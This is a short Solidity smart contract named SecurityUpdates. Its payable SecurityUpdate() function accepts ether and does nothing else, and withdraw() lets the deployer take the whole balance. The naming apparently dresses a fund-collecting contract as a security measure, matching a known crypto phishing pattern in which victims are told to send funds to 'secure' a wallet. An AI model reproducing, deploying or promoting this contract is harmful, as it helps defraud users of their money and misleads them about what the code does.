// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SecurityUpdates {

    address private  owner;    // current owner of the contract

     constructor(){   
        owner=msg.sender;
    }

    function withdraw() public {
        require(owner == msg.sender);
        address payable _to = payable(owner);
        address _thisContract = address(this);
        _to.transfer(_thisContract.balance);
    }

    function SecurityUpdate() public payable {
    }
}